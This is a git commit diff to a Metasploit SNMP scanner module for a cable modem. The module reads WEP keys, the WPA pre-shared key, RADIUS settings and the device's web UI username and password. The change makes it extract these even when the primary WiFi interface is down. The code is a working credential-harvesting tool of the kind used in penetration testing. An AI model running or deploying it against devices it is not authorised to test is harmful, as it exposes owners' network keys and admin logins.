f1cd601401f2794e83612081db6b557019804c57
inokii <inokii@users.noreply.github.com>
2014-05-13 00:15:21 -0400

    Modified logic to attempt to process WiFi key data even if primary Wifi interface is not up

--- modules/auxiliary/scanner/snmp/sbg6580_enum.rb
+++ modules/auxiliary/scanner/snmp/sbg6580_enum.rb
@@ -54,76 +54,73 @@ class Metasploit3 < Msf::Auxiliary
         print_good("#{ip}, Connected.")
 
         primaryWifiState = snmp.get_value('1.3.6.1.2.1.2.2.1.8.32').to_i
-        if primaryWifiState == 1
-          # primary Wifi interface up
-          ssid = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.32').to_s
-          output_data["SSID"] = ssid.strip
-
-          wireless_band = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.1.18.0').to_i
-          output_data["802.11 Band"] = get_wireless_band_name(wireless_band)
-
-          network_auth_mode = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.5.32').to_i
-          network_auth_mode_name = get_network_auth_mode_name(network_auth_mode)
-          output_data["Network Authentication Mode"] = network_auth_mode_name
-
-          case network_auth_mode
-          when 1, 6
-            # WEP, WEP 802.1x Authentication
-            wep_passphrase = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.3.32').to_s
-            output_data["WEP Passphrase"] = wep_passphrase.strip
-
-            wep_encryption = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.2.32').to_i
-            wep_encryption_name = "unknown"
-            wep_key1 = wep_key2 = wep_key3 = wep_key4 = ""
-            # get appropriate WEP keys based on wep_encryption setting
-            if wep_encryption == 1
-              wep_encryption_name = "64-bit"
-              # TODO: need to test what to_s does to the SNMP hex-string
-              wep_key1 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.1').to_s
-              wep_key2 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.2').to_s
-              wep_key3 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.3').to_s
-              wep_key4 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.4').to_s
-            elsif wep_encryption == 2
-              wep_encryption_name = "128-bit"
-              # TODO: need to test what to_s does to the SNMP hex-string
-              wep_key1 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.1').to_s
-              wep_key2 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.2').to_s
-              wep_key3 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.3').to_s
-              wep_key4 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.4').to_s
-            end
-            output_data["WEP Encryption"] = wep_encryption_name
-            output_data["WEP Key 1"] = wep_key1.strip
-            output_data["WEP Key 2"] = wep_key2.strip
-            output_data["WEP Key 3"] = wep_key3.strip
-            output_data["WEP Key 4"] = wep_key4.strip
-
-            # get current network key
-            # TODO: need to test what to_i does to Gauge32: Gauge32: 1 / = Gauge32: 2  = Gauge32: 3 = Gauge32: 4
-            currentKey = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.1.32').to_i
-            output_data["Current Network Key"] = currentKey
-
-            if network_auth_mode == 6
-              get_radius_info(snmp, output_data)
-            end
-
-          when 2, 3, 4, 5, 7, 8
-            # process all flavors of WPA
-            wpa_encryption = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.4.1.1.32').to_i
-            output_data["WPA Encryption"] = get_wpa_encryption_name(wpa_encryption)
-
-            wpa_psk = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.4.1.2.32').to_s
-            output_data["WPA Pre-Shared Key (PSK)"] = wpa_psk.strip
-            
-            case network_auth_mode
-            when 4, 5, 8
-              get_radius_info(snmp, output_data)
-            end
-
-          else
-            print_error("Unknown network authentication mode '#{network_auth_mode}'")
-          end
-        else
+        if primaryWifiState != 1
+          # primary Wifi interface is not up
           print_status("Primary WiFi is disabled on the device")
+        end
+
+        ssid = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.32').to_s
+        output_data["SSID"] = ssid.strip
+
+        wireless_band = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.1.18.0').to_i
+        output_data["802.11 Band"] = get_wireless_band_name(wireless_band)
+
+        network_auth_mode = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.5.32').to_i
+        network_auth_mode_name = get_network_auth_mode_name(network_auth_mode)
+        output_data["Network Authentication Mode"] = network_auth_mode_name
+
+        case network_auth_mode
+        when 1, 6
+          # WEP, WEP 802.1x Authentication
+          wep_passphrase = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.3.32').to_s
+          output_data["WEP Passphrase"] = wep_passphrase.strip
+
+          wep_encryption = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.2.32').to_i
+          wep_encryption_name = "unknown"
+          wep_key1 = wep_key2 = wep_key3 = wep_key4 = ""
+          # get appropriate WEP keys based on wep_encryption setting
+          if wep_encryption == 1
+            wep_encryption_name = "64-bit"
+            # TODO: need to test what to_s does to the SNMP hex-string
+            wep_key1 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.1').to_s
+            wep_key2 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.2').to_s
+            wep_key3 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.3').to_s
+            wep_key4 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.4').to_s
+          elsif wep_encryption == 2
+            wep_encryption_name = "128-bit"
+            # TODO: need to test what to_s does to the SNMP hex-string
+            wep_key1 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.1').to_s
+            wep_key2 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.2').to_s
+            wep_key3 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.3').to_s
+            wep_key4 = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.4').to_s
+          end
+          output_data["WEP Encryption"] = wep_encryption_name
+          output_data["WEP Key 1"] = wep_key1.strip
+          output_data["WEP Key 2"] = wep_key2.strip
+          output_data["WEP Key 3"] = wep_key3.strip
+          output_data["WEP Key 4"] = wep_key4.strip
+
+          # get current network key
+          # TODO: need to test what to_i does to Gauge32: Gauge32: 1 / = Gauge32: 2  = Gauge32: 3 = Gauge32: 4
+          currentKey = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.1.1.1.32').to_i
+          output_data["Current Network Key"] = currentKey
+
+          if network_auth_mode == 6
+            get_radius_info(snmp, output_data)
+          end
+
+        when 2, 3, 4, 5, 7, 8
+          # process all flavors of WPA
+          wpa_encryption = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.4.1.1.32').to_i
+          output_data["WPA Encryption"] = get_wpa_encryption_name(wpa_encryption)
+
+          wpa_psk = snmp.get_value('1.3.6.1.4.1.4413.2.2.2.1.5.4.2.4.1.2.32').to_s
+          output_data["WPA Pre-Shared Key (PSK)"] = wpa_psk.strip
+          
+          case network_auth_mode
+          when 4, 5, 8
+            get_radius_info(snmp, output_data)
+          end
         end
 
         # attempt to get the username and password for the device user interface
@@ -140,38 +137,38 @@ class Metasploit3 < Msf::Auxiliary
           deviceUiPassword = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0').to_s
           output_data["Device UI Password"] = deviceUiPassword.strip
         end
-    end
 
-    # output
-    print_line("")
-    print_status("System information:\n")
-    line = ""
-    width = 30  # name field width
+        # output
+        print_line("")
+        print_status("System information:\n")
+        line = ""
+        width = 30  # name field width
 
-    fields_order.each {|k|
-      if not output_data.has_key?(k)
-        next
+        fields_order.each {|k|
+          if not output_data.has_key?(k)
+            next
+          end
+
+          v = output_data[k]
+          if (v.nil? or v.empty? or v =~ /Null/)
+            v = '-'
+          end
+
+          report_note(
+            :host  => ip,
+            :proto => 'udp',
+            :sname => 'snmp',
+            :port  => datastore['RPORT'].to_i,
+            :type  => "snmp.#{k}",
+            :data  => v
+          )
+
+          line << sprintf("%s%s: %s\n", k, " "*([0,width-k.length].max), v)
+        }
+
+        print_line(line)
+        #print_line("")
       end
-
-      v = output_data[k]
-      if (v.nil? or v.empty? or v =~ /Null/)
-        v = '-'
-      end
-
-      report_note(
-        :host  => ip,
-        :proto => 'udp',
-        :sname => 'snmp',
-        :port  => datastore['RPORT'].to_i,
-        :type  => "snmp.#{k}",
-        :data  => v
-      )
-
-      line << sprintf("%s%s: %s\n", k, " "*([0,width-k.length].max), v)
-    }
-
-    print_line(line)
-    print_line("")
 
     rescue SNMP::RequestTimeout
       vprint_status("#{ip} SNMP request timeout.")
